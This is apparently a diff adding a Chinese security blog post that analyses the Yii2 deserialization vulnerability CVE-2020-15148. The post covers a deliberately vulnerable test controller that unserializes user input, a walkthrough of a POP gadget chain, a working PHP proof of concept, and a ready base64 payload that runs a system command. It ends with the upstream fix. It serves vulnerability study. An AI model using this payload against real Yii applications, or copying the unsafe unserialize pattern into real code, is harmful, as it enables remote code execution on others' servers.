@@ -1,0 +1,666 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
+  <link rel="icon" href="/img/icon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="jelly">
+  <meta name="keywords" content="">
+  
+  <title>Yii2 反序列化利用链总结 - jelly&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":"14de5c0cf6db6044f06b32ef50694a98","google":"G-1S553HH16G","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Jelly's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/doll.webp') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="Yii2 反序列化利用链总结">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-09-12 11:53" pubdate>
+        2021年9月12日 中午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      50
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Yii2 反序列化利用链总结</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：33 分钟前
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Yii 是一个高性能，基于组件的 PHP 框架，用于快速开发现代 Web 应用程序。Yii主要有 1.1 和 2.0 两个版本，目前官方都在维护这两个版本，Yii2.0 是一个重写的版本，和 Yii1.1 有很大不同。</p>
+<p>本次漏洞出现在 Yii2.0 版本上，在2020年9月左右（HW期间） Yii 被爆出反序列化漏洞，如果程序在用户可以控制的输入处调用了unserialize() 并允许特殊字符的情况下，将会受到反序列化远程命令命令执行漏洞攻击。</p>
+<p>注意，该漏洞只是发掘了 php 反序列化的利用链，必须要配合<code>unserialize</code>函数才可以达到任意代码执行的危害。在该漏洞爆出后，很多师傅相继挖出更多的 Yii 反序列利用链。</p>
+<p>【漏洞编号】CVE-2020-15148</p>
+<p>【影响版本】Yii2 &lt;= 2.0.37</p>
+<p>【全文概述】本文主要分析Yii2的POP链，在寻找到程序的反序列化操作后利用这些POP链可以直接RCE。本文先分析 CVE-2020-15148 中的POP链，然后分析了大佬们挖到的新的POP链，虽然新的POP链主要来自Yii使用的组件，但该POP链可能具有通杀的效果</p>
+<p>我看到很多博主提到 POP 链这个概念，我没有找到十分官方的说法，我的理解就是反序列化利用链</p>
+<blockquote>
+<p>POP（Property Oriented Programming）：面向属性编程</p>
+<p>POP链（POP CHAIN）：把魔术方法作为入口，然后在魔术方法中调用其他函数，通过寻找一系列函数，最后执行恶意代码，就构成了POP CHAIN 。当unserialize()传入的参数可控，便可以通过反序列化漏洞控制反序列化的类的属性，从而执行POP CHAIN，达到利用特定漏洞的效果。</p>
+</blockquote>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>在官方仓库下载 Yii 2.0.37：<a target="_blank" rel="noopener" href="https://github.com/yiisoft/yii2/releases/tag/2.0.37">https://github.com/yiisoft/yii2/releases/tag/2.0.37</a> </p>
+<p>Yii 一般会同时发布basic和advanced版本，我这里下载的是basic版本，而advanced版本相当于basic版本的升级版本。</p>
+<p>【添加密钥】</p>
+<p>Yii 程序需要配置密钥，否则程序会报错不能运行。</p>
+<p>修改 <code>config/web.php</code> 文件，给 <code>cookieValidationKey</code> 配置项添加一个密钥，随便输入一个值即可（若你通过 Composer 安装，则此步骤会自动完成）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// !!! 在下面插入一段密钥（若为空） - 以供 cookie validation 的需要</span><br><span class="hljs-string">&#x27;cookieValidationKey&#x27;</span> =&gt; <span class="hljs-string">&#x27;在此处输入你的密钥&#x27;</span>,<br></code></pre></td></tr></table></figure>
+
+<p>【添加反序列化入口】</p>
+<p>本次复现重点在于触发反序列化利用链，Yii 本身是不存在触发反序列化利用链的Action，这里我们手动添加一个存在漏洞的Action </p>
+<p>/controllers/TestController.php:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">controllers</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">Yii</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">web</span>\<span class="hljs-title">Controleer</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">actionTest</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$name</span> = Yii:<span class="hljs-variable">$app</span>-&gt;request-&gt;get(<span class="hljs-string">&#x27;data&#x27;</span>);<br>        <span class="hljs-keyword">return</span> unserialize(base64_decode(<span class="hljs-variable">$name</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>PS：这里对反序列化数据做了 base64 编码传输，测试没有编码也是可以传输的，以应对更多情况的真实场景</p>
+<p>【启动应用】</p>
+<p>在web目录下可以使用以下命令快速启动一个 yii 应用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">$ php yii serve<br>Server started on http:<span class="hljs-comment">//localhost:8080/</span><br>Document root is <span class="hljs-string">&quot;/Users/xy/big/xy/free/basic/web&quot;</span><br>Quit the server with CTRL-C <span class="hljs-keyword">or</span> COMMAND-C.<br></code></pre></td></tr></table></figure>
+
+<img src="img/yii反序列化漏洞/image-20210622111350190.png" srcset="/img/loading.gif" lazyload alt="image-20210622111350190" style="zoom: 25%;" />
+
+<p>不过我最终还是搭建在了 MAMP 上，localhost这种在抓包发包上还是有点麻烦</p>
+<h1 id="寻找反序列化入口"><a href="#寻找反序列化入口" class="headerlink" title="寻找反序列化入口"></a>寻找反序列化入口</h1><p>本文只记录了yii POP链，利用这些POP链需要程序执行反序列化操作，即 unserialize()。这里记录两个目前我能想到的找到反序列化入口的地方：</p>
+<p>1）留意程序的序列化数据，如果发现有序列化数据到服务器端，大概率会触发unserialize()。白盒测试的话就是寻找unserialize()的参数是否可控。</p>
+<p>2）构造phar格式文件，并能使用phar协议读取该文件</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在挖掘POP链时，需要知道的是，在反序列化漏洞中，我们通常会构造序列化对象，我们可以容易的控制对象的属性。</p>
+<p>本文记录了4条利用链，POP1和POP2都是基于<code>BatchQueryResult</code>类的反序列化问题，可用于2.0.37 以前的版本，POP1和POP2类似，主要参考POP1</p>
+<p>POP3和POP4来自：<a target="_blank" rel="noopener" href="https://github.com/yiisoft/yii2/issues/18293">https://github.com/yiisoft/yii2/issues/18293</a></p>
+<p>其中 POP3 来自 yii 使用的 CodeCeption 框架，该框架一般用于功能测试</p>
+<p>其中 POP4 来自 yii 使用的 swiftmailer ，属于邮件处理组件。所以作者发现了这两个利用链官方并没有收录修改。</p>
+<p>目前没有看到这两个组件有什么修改，主要是漏洞产生是两个不同组织的代码，如果目标系统使用了这两个组件，可能会产生通杀的效果</p>
+<h2 id="POP1"><a href="#POP1" class="headerlink" title="POP1"></a>POP1</h2><p>先分析漏洞爆出时的一条POP链</p>
+<p>漏洞入口点定位在：vendor/yiisoft/yii2/db/BatchQueryResult.php </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BaseObject</span> <span class="hljs-keyword">implements</span> \<span class="hljs-title">Iterator</span></span><br><span class="hljs-class"></span>&#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-variable">$_dataReader</span>; <span class="hljs-comment">// line：56</span><br>	<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)	//<span class="hljs-title">line</span>：79-83</span><br><span class="hljs-function">  </span>&#123;<br>      <span class="hljs-comment">// make sure cursor is closed</span><br>      <span class="hljs-keyword">$this</span>-&gt;reset();<br>  &#125;<br>	<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reset</span>(<span class="hljs-params"></span>)  //<span class="hljs-title">line</span>：89-98</span><br><span class="hljs-function">  </span>&#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;_dataReader !== <span class="hljs-literal">null</span>) &#123;<br>          <span class="hljs-keyword">$this</span>-&gt;_dataReader-&gt;close();<br>      &#125;<br>      <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-literal">null</span>;<br>      <span class="hljs-keyword">$this</span>-&gt;_batch = <span class="hljs-literal">null</span>;<br>      <span class="hljs-keyword">$this</span>-&gt;_value = <span class="hljs-literal">null</span>;<br>      <span class="hljs-keyword">$this</span>-&gt;_key = <span class="hljs-literal">null</span>;<br>  &#125;<br>……<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>对象被销毁<code>__destruct()</code>的时候，会调用<code>reset()</code>方法</p>
+</li>
+<li><p>在reset()方法中，<code>$this-&gt;_dataReader</code>调用了<code>close()</code>方法，这个函数在类中并不存在，而<code>$this-&gt;_dataReader</code>我们可在编写序列化对象时可控，因此可以利用该处触发 <code>__call()</code> 魔术方法</p>
+</li>
+</ul>
+<p>接下来就是要寻找可利用的点，可以全局搜索<code>__call</code>方法</p>
+<img src="img/yii反序列化漏洞/image-20210622120639320.png" srcset="/img/loading.gif" lazyload alt="image-20210622120639320" style="zoom:50%;" />
+
+<ul>
+<li>于是找到如下文件</li>
+</ul>
+<p>vendor/fzaninotto/faker/src/Faker/Generator.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span><br><span class="hljs-class"></span>&#123;<br>  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$formatters</span> = <span class="hljs-keyword">array</span>();														<span class="hljs-comment">//line:201</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">format</span>(<span class="hljs-params"><span class="hljs-variable">$formatter</span>, <span class="hljs-variable">$arguments</span> = <span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>)		//<span class="hljs-title">line</span>:226-229</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> call_user_func_array(<span class="hljs-keyword">$this</span>-&gt;getFormatter(<span class="hljs-variable">$formatter</span>), <span class="hljs-variable">$arguments</span>);<br>    &#125;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFormatter</span>(<span class="hljs-params"><span class="hljs-variable">$formatter</span></span>)										//<span class="hljs-title">line</span>:236-249</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-variable">$formatter</span>])) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-variable">$formatter</span>];<br>        &#125;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;providers <span class="hljs-keyword">as</span> <span class="hljs-variable">$provider</span>) &#123;<br>            <span class="hljs-keyword">if</span> (method_exists(<span class="hljs-variable">$provider</span>, <span class="hljs-variable">$formatter</span>)) &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-variable">$formatter</span>] = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$provider</span>, <span class="hljs-variable">$formatter</span>);<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-variable">$formatter</span>];<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> \<span class="hljs-built_in">InvalidArgumentException</span>(sprintf(<span class="hljs-string">&#x27;Unknown formatter &quot;%s&quot;&#x27;</span>, <span class="hljs-variable">$formatter</span>));<br>    &#125;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$attributes</span></span>)								//<span class="hljs-title">line</span>:283-286</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;format(<span class="hljs-variable">$method</span>, <span class="hljs-variable">$attributes</span>);<br>    &#125;<br>  ……<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>这个类的<code>__call()</code>方法会调用<code>format()</code>方法。触发<code>__call()</code>方法的是<code>close()</code>方法，传入的参数为空，所以<code>$method=&#39;close&#39;</code>，<code>$attributes</code>为空</p>
+</li>
+<li><p><code>format()</code>方法调用了<code>call_user_func_array()</code>方法，<code>call_user_func_array()</code>的第一个参数为要执行的回调函数，由<code>getFormatter()</code>方法获取</p>
+</li>
+<li><p><code>getFormatter()</code> 主要利用 <code>$this-&gt;formatters[$formatter]</code>返回结果 。 <code>$this-&gt;formatters</code> 可控，我们便可在此处构造我们想执行的任意函数。而<code>$formatter</code>来自于<code>__call($method,$attributes)</code>中的<code>$method</code>，<code>$formatter=&#39;close&#39;</code>，<code>$formatter</code>不可控</p>
+</li>
+</ul>
+<p>目前<code>$arguments=&#39;close&#39;</code>，<code>this-&gt;formatters</code>可控，<code>$arguments</code>为空。也就是说<code>call_user_func_array()</code>这个函数的第一个参数可控，第二个参数为空。所以我们只能<strong>不带参数</strong>地去调用别的类中的方法，那么我们就需要去寻找能执行命令的函数，这个函数需要满足以下条件：</p>
+<p>​    1）方法所需的参数只能是其自己类中存在的（即参数：<code>$this-&gt;args</code>）</p>
+<p>​    2）方法需要有命令执行功能</p>
+<p>最后通过<code>call_user_func\(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)</code>的正则来查找到两个方法比较合适：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">yii\rest\CreateAction::run()<br>yii\rest\IndexAction::run()<br></code></pre></td></tr></table></figure>
+
+<img src="img/yii反序列化漏洞/image-20210622145034158.png" srcset="/img/loading.gif" lazyload alt="image-20210622145034158" style="zoom:50%;" />
+
+<p>vendor/yiisoft/yii2/rest/CreateAction.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CreateAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Action</span></span><br><span class="hljs-class"></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;checkAccess) &#123;<br>            call_user_func(<span class="hljs-keyword">$this</span>-&gt;checkAccess, <span class="hljs-keyword">$this</span>-&gt;id);<br>        &#125;<br>……<br></code></pre></td></tr></table></figure>
+
+<p>vendor/yiisoft/yii2/rest/IndexAction.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Action</span></span><br><span class="hljs-class"></span>&#123;<br>  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;checkAccess) &#123;<br>            call_user_func(<span class="hljs-keyword">$this</span>-&gt;checkAccess, <span class="hljs-keyword">$this</span>-&gt;id);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;prepareDataProvider();<br>    &#125;<br>  ……<br></code></pre></td></tr></table></figure>
+
+<p>至此，我们获取了完整的POP链</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">POP1:<br>yii\db\BatchQueryResult::__destruct()-&gt;reset()-&gt;close()<br>-&gt;<br>Faker\Generator::__call()-&gt;format()-&gt;call_user_func_array()<br>-&gt;<br>yii\rest\IndexAction::run-&gt;call_user_func()<br></code></pre></td></tr></table></figure>
+
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>便构造如下POC：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>&#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">IndexAction</span>&#123;<br>        <span class="hljs-title">public</span> $<span class="hljs-title">checkAccess</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;checkAccess = <span class="hljs-string">&#x27;system&#x27;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;id = <span class="hljs-string">&#x27;whoami&#x27;</span>;           <span class="hljs-comment">//command</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">IndexAction</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$formatters</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;close&#x27;</span>] = [<span class="hljs-keyword">new</span> IndexAction, <span class="hljs-string">&#x27;run&#x27;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>&#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$_dataReader</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span>&#123;<br>    <span class="hljs-title">echo</span> <span class="hljs-title">base64_encode</span>(<span class="hljs-title">serialize</span>(<span class="hljs-title">new</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>\<span class="hljs-title">BatchQueryResult</span>));<br>    <span class="hljs-comment">//TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo2OiJzeXN0ZW0iO3M6MjoiaWQiO3M6Njoid2hvYW1pIjt9aToxO3M6MzoicnVuIjt9fX19</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>测试结果如下：</p>
+<img src="img/yii反序列化漏洞/image-20210623104001170.png" srcset="/img/loading.gif" lazyload alt="image-20210623104001170" style="zoom:50%;" />
+
+<h3 id="修复情况"><a href="#修复情况" class="headerlink" title="修复情况"></a>修复情况</h3><p>在yii 2.0.38 中修复了该漏洞，可以在commit记录中查看修改</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99">https://github.com/yiisoft/yii2/commit/9abccb96d7c5ddb569f92d1a748f50ee9b3e2b99</a></p>
+<img src="img/yii反序列化漏洞/image-20210623110330650.png" srcset="/img/loading.gif" lazyload alt="image-20210623110330650" style="zoom:50%;" />
+
